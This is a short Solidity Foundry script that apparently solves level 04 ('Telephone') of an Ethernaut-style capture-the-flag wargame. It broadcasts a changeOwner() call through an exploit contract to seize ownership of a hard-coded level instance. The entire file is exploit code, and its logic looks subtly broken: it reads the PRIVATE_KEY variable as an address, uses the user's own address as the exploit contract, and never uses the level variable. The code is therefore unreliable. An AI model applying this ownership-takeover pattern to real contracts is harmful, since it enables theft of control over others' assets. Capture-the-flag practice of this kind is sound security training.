// SPDX-License-Identifier: CC-BY-4.0
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import {Telephone} from "src/04/Telephone.sol";
import {TelephoneExploit} from "src/04/TelephoneExploit.sol";

contract Exploit is Script {

        address userOwner = vm.envAddress("PRIVATE_KEY");
        TelephoneExploit exploit = TelephoneExploit(userOwner);
        address levelInstance = 0x7249C705bDf64c3b72CcB9fdd0f410Fd52666422;
        Telephone level = Telephone(levelInstance);

        function run() external {

            vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
            exploit.changeOwner();
            vm.stopBroadcast();
    }
}